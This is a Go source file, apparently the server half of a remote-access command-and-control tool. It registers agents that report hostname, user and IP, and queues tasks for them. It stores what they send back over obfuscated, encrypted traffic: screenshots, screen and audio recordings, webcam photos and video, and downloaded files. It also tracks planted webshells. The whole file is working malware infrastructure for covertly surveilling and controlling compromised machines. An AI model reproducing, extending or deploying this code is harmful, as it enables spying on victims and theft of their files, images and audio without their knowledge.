package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ============ Agent 通信端点（与 app.py /agent/* 路由对齐）============
// 三个端点: /agent/heartbeat, /agent/pull, /agent/result
// 通信协议: 加密 base64 请求/响应体 + X-Enc-Algo 头标识算法

// getRequestAlgo 从请求头获取加密算法标识（与 app.py _get_request_algo 对齐）
func getRequestAlgo(r *http.Request) string {
	algo := strings.ToLower(strings.TrimSpace(r.Header.Get("X-Enc-Algo")))
	if algo == "" {
		return "none"
	}
	return algo
}

// getGlobalAlgo 获取全局配置的加密算法（与 app.py _get_global_algo 对齐）
func getGlobalAlgo() string {
	algo := getSettingDefault("traffic_encryption", "none")
	if algo == "aes" {
		algo = "aes-128-cbc"
	}
	return algo
}

// decryptRequestData 解密 Agent 请求体（与 app.py _decrypt_request_data 对齐）
func decryptRequestData(r *http.Request) (map[string]interface{}, error) {
	algo := getRequestAlgo(r)
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return nil, fmt.Errorf("读取请求体失败: %w", err)
	}
	raw := strings.TrimSpace(string(body))
	if raw == "" {
		return map[string]interface{}{}, nil
	}

	if algo != "none" {
		// 加密模式: 用请求头指定的算法解密
		decrypted, err := encDecrypt(raw, algo, getEncPassword())
		if err != nil {
			// 解密失败：尝试直接 JSON 解析（兼容明文）
			var m map[string]interface{}
			if jErr := json.Unmarshal([]byte(raw), &m); jErr == nil {
				return m, nil
			}
			return nil, fmt.Errorf("解密失败(algo=%s): %w", algo, err)
		}
		var m map[string]interface{}
		if err := json.Unmarshal(decrypted, &m); err != nil {
			return nil, fmt.Errorf("JSON 解析失败: %w", err)
		}
		return m, nil
	}

	// none 模式: 尝试直接 JSON 解析
	var m map[string]interface{}
	if err := json.Unmarshal([]byte(raw), &m); err == nil {
		return m, nil
	}
	// 尝试 base64 解码后 JSON 解析
	decoded, dErr := encDecrypt(raw, "none", getEncPassword())
	if dErr == nil {
		if err := json.Unmarshal(decoded, &m); err == nil {
			return m, nil
		}
	}
	return map[string]interface{}{}, nil
}

// encryptResponseData 加密响应数据（与 app.py _encrypt_response_data 对齐）
// 返回: (encrypted_str, algo)
func encryptResponseData(r *http.Request, data interface{}) (string, string) {
	algo := getRequestAlgo(r)
	if algo != "none" {
		encrypted, _, err := encEncrypt(data, algo, getEncPassword())
		if err != nil {
			// 加密失败回退到明文 JSON
			j, _ := json.Marshal(data)
			return string(j), "none"
		}
		return encrypted, algo
	}
	// none 模式: 响应算法与请求一致
	// 如果请求带了 X-Enc-Algo: none → 返回 base64(JSON)（与 C agent none 模式对齐）
	if r.Header.Get("X-Enc-Algo") != "" {
		j, _ := json.Marshal(data)
		return base64.StdEncoding.EncodeToString(j), "none"
	}
	// 无 X-Enc-Algo 头 → 返回纯 JSON
	j, _ := json.Marshal(data)
	return string(j), "none"
}

// writeEncryptedResponse 写入加密响应
func writeEncryptedResponse(w http.ResponseWriter, r *http.Request, data interface{}) {
	encStr, algo := encryptResponseData(r, data)
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("X-Enc-Algo", algo)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(encStr))
}

// ============ /agent/heartbeat（与 app.py agent_heartbeat 对齐）============

func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
		return
	}

	clientID := getString(data, "client_id", "")
	if clientID == "" {
		jsonError(w, "invalid", http.StatusBadRequest)
		return
	}

	ip := getRequestIP(r)
	existing, _ := queryOne("SELECT * FROM clients WHERE client_id=?", clientID)

	var sessID string
	if existing != nil {
		// 已有客户端: 复用 session_id，重新激活
		sessID = getString(existing, "session_id", "")
		if sessID == "" {
			sessID = fmt.Sprintf("S-%s-%d", strings.ToUpper(clientID[:8]), time.Now().Unix()%100000)
		}
		dbExec(`UPDATE clients SET
			status='online', last_seen=?,
			hostname=?, os=?, os_version=?, arch=?, username=?, ip=?,
			session_id=?, session_state='active'
			WHERE client_id=?`,
			nowLocal(), getString(data, "hostname", ""), getString(data, "os", ""),
			getString(data, "os_version", ""), getString(data, "arch", ""),
			getString(data, "username", ""), ip, sessID, clientID)
	} else {
		// 新客户端上线
		sessID = fmt.Sprintf("S-%s-%d", strings.ToUpper(clientID[:8]), time.Now().Unix()%100000)
		dbExec(`INSERT INTO clients
			(client_id, hostname, os, os_version, arch, username, ip, status, group_name,
			 session_id, session_state, session_started, client_type)
			VALUES (?, ?, ?, ?, ?, ?, ?, 'online', 'default', ?, 'active', ?, 'agent')`,
			clientID, getString(data, "hostname", ""), getString(data, "os", ""),
			getString(data, "os_version", ""), getString(data, "arch", ""),
			getString(data, "username", ""), ip, sessID, nowLocal())
		addLog("client", fmt.Sprintf("新客户端上线: %s (session: %s)", clientID, sessID), clientID, 0, ip)
	}

	broadcastClientUpdate()

	writeEncryptedResponse(w, r, map[string]interface{}{
		"status":     "ok",
		"client_id":  clientID,
		"session_id": sessID,
	})
}

// ============ /agent/pull（与 app.py agent_pull 对齐）============

func handleAgentPull(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
		return
	}

	clientID := getString(data, "client_id", "")

	// 更新在线状态
	dbExec("UPDATE clients SET status='online', last_seen=? WHERE client_id=?", nowLocal(), clientID)

	// 查询 pending 任务
	tasks, _ := queryAll("SELECT * FROM tasks WHERE client_id=? AND status='pending' ORDER BY created_at", clientID)

	taskList := []map[string]interface{}{}
	for _, task := range tasks {
		taskID := getInt(task, "id", 0)
		// 标记为 processing
		dbExec("UPDATE tasks SET status='processing' WHERE id=?", taskID)

		// 解析 task_data
		var taskData interface{} = map[string]interface{}{}
		taskDataStr := getString(task, "task_data", "")
		if taskDataStr != "" {
			var td interface{}
			if err := json.Unmarshal([]byte(taskDataStr), &td); err == nil {
				taskData = td
			}
		}

		taskList = append(taskList, map[string]interface{}{
			"id":        taskID,
			"task_type": getString(task, "task_type", ""),
			"task_data": taskData,
		})
	}

	writeEncryptedResponse(w, r, map[string]interface{}{"tasks": taskList})
}

// ============ /agent/result（与 app.py agent_result 对齐）============

func handleAgentResult(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
		return
	}

	taskID := getInt(data, "task_id", 0)
	result := getString(data, "result", "")
	status := getString(data, "status", "completed")
	if status == "" {
		status = "completed"
	}

	task, _ := queryOne("SELECT * FROM tasks WHERE id=?", taskID)
	if task == nil {
		jsonError(w, "task not found", http.StatusNotFound)
		return
	}

	taskType := getString(task, "task_type", "")
	clientID := getString(task, "client_id", "")

	// 资源类型任务：将 base64 数据保存为文件
	resourceTypes := map[string]bool{
		"screenshot": true, "record_screen": true, "record_audio": true,
		"camera_photo": true, "camera_record": true, "file_download": true,
	}

	var dbResult string
	if resourceTypes[taskType] && result != "" && !strings.HasPrefix(result, "[ERROR]") && len(result) > 500 {
		dbResult = saveResourceFile(taskType, clientID, taskID, result)
	} else {
		// 普通任务: 截断到 50000 字符
		if len(result) > 50000 {
			result = result[:50000]
		}
		dbResult = result
	}

	dbExec("UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?",
		status, dbResult, nowLocal(), taskID)
	dbExec("UPDATE clients SET last_seen=?, status='online' WHERE client_id=?", nowLocal(), clientID)

	broadcastTaskUpdate()

	writeEncryptedResponse(w, r, map[string]interface{}{"status": "ok"})
}

// saveResourceFile 保存资源文件到 tmp 目录，返回 JSON 路径引用
// 与 app.py agent_result 中的资源保存逻辑对齐
func saveResourceFile(taskType, clientID string, taskID int64, result string) string {
	extMap := map[string][2]string{
		"screenshot":    {"screenshots", "jpg"},
		"record_screen": {"recordings", "avi"},
		"record_audio":  {"audio", "wav"},
		"camera_photo":  {"screenshots", "jpg"},
		"camera_record": {"recordings", "avi"},
		"file_download": {"downloads", "bin"},
	}
	subdir, ext := "downloads", "bin"
	if v, ok := extMap[taskType]; ok {
		subdir, ext = v[0], v[1]
	}

	// file_download 返回 JSON: {"filename":"xxx","data":"base64..."}
	var raw []byte
	origFilename := ""
	if taskType == "file_download" {
		var dlData struct {
			Filename string `json:"filename"`
			Data     string `json:"data"`
		}
		if err := json.Unmarshal([]byte(result), &dlData); err == nil {
			origFilename = dlData.Filename
			raw, _ = base64.StdEncoding.DecodeString(dlData.Data)
		}
	} else {
		raw, _ = base64.StdEncoding.DecodeString(result)
	}

	if raw == nil {
		if len(result) > 5000 {
			return result[:5000]
		}
		return result
	}

	// 保留原始文件扩展名
	if origFilename != "" && strings.Contains(origFilename, ".") {
		parts := strings.Split(origFilename, ".")
		ext = strings.ToLower(parts[len(parts)-1])
	}

	// 安全文件名
	safeOrig := sanitizeFilename(origFilename)
	filename := fmt.Sprintf("%s_%d_%d%s.%s", clientID, taskID, time.Now().Unix(), safeOrig, ext)
	if safeOrig == "" {
		filename = fmt.Sprintf("%s_%d_%d.%s", clientID, taskID, time.Now().Unix(), ext)
	}

	tmpDir := getTmpDir()
	resDir := filepath.Join(tmpDir, subdir)
	os.MkdirAll(resDir, 0755)

	filePath := filepath.Join(resDir, filename)
	if err := os.WriteFile(filePath, raw, 0644); err != nil {
		return result[:5000]
	}

	dbResult, _ := json.Marshal(map[string]interface{}{
		"type":     "file",
		"path":     fmt.Sprintf("/api/resource/%s/%s", subdir, filename),
		"size":     len(raw),
		"filename": origFilename,
	})
	return string(dbResult)
}

// sanitizeFilename 清理文件名（只保留字母数字和 ._-，最多 50 字符）
func sanitizeFilename(name string) string {
	var sb strings.Builder
	for _, c := range name {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-' {
			sb.WriteRune(c)
		}
	}
	result := sb.String()
	if len(result) > 50 {
		result = result[:50]
	}
	return result
}

// getTmpDir 获取临时文件目录
func getTmpDir() string {
	return filepath.Join(serverDir, "tmp")
}

// ============ 离线检测（与 app.py check_offline_clients 对齐）============

// startOfflineChecker 启动离线检测 goroutine
func startOfflineChecker() {
	go func() {
		for {
			time.Sleep(10 * time.Second)
			// WebShell 类型不按心跳判定离线
			// nowLocal() 返回北京时间字符串，与 last_seen 存储格式一致
			threshold := time.Now().In(getBeijingLoc()).Add(-30 * time.Second).Format("2006-01-02 15:04:05")
			dbExec("UPDATE clients SET status='offline' WHERE last_seen < ? AND status='online' AND (client_type != 'webshell' OR client_type IS NULL)", threshold)
			broadcastClientUpdate()
		}
	}()
}
